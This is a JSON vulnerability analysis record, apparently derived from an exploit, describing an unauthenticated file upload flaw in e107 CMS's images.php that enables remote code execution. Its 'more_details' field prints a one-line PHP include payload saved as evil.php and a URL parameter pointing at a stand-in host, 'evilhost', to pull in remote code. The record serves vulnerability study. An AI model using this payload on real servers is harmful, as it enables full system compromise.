{
  "vulnerability_details": {
    "root_cause": "The vulnerability lies in the `images.php` file within the e107 CMS. It allows for remote file uploads via a multipart form-data POST request without proper sanitization.",
    "weaknesses": [
      "Unrestricted file upload",
      "Remote file inclusion vulnerability"
    ],
    "impact": "An attacker can upload a malicious PHP file to the server and then execute arbitrary code by including it. This can lead to full compromise of the system.",
    "attack_vectors": "Sending a crafted POST request to `images.php` with the malicious PHP code embedded in the 'upload' form field.",
    "required_capabilities": "The attacker needs to be able to send HTTP requests to the vulnerable server. No authentication is required.",
     "more_details": "The exploit uses a crafted HTTP POST request to upload a file named `evil.php` with the content `<? include($owned); ?>`.  This code is then triggered by accessing `evil.php` with a URL parameter like `?owned=http://evilhost/`. This enables an attacker to include and run code from an arbitrary URL. The vulnerability exists in multiple handlers (e107_handlers and handlers) directory, which allows flexibility when attempting to exploit the system."
